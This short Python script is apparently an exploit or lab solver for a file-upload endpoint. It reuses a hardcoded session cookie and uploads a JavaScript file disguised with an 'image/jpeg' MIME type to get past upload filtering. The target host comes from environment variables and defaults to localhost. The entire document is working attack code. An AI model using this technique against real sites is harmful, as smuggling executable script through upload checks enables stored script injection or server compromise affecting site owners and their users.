import requests
import os

XLSX_MIMETYPE = "image/jpeg"
url = "http://{}:{}/upload".format(os.getenv("HOST", "localhost"), os.getenv("PORT", "8001"))
cookies = {"session": "eyJ1c2VyX2lkIjoiMTIzYjA0MjM5NmM5ZjIxMWYyMTQwYjg5NTczZjRhMjEiLCJ1c2VybmFtZSI6IiJ9.YL9xuA.9fLj0tKLecq9kfEwtlipIuZH96s"}

images = {}
with open("show_utils.js", "rb") as f:
    images["images[]"] = ("show_utils.js", f.read(), XLSX_MIMETYPE)

r = requests.post(url, files=images, cookies=cookies)
print(r.text)
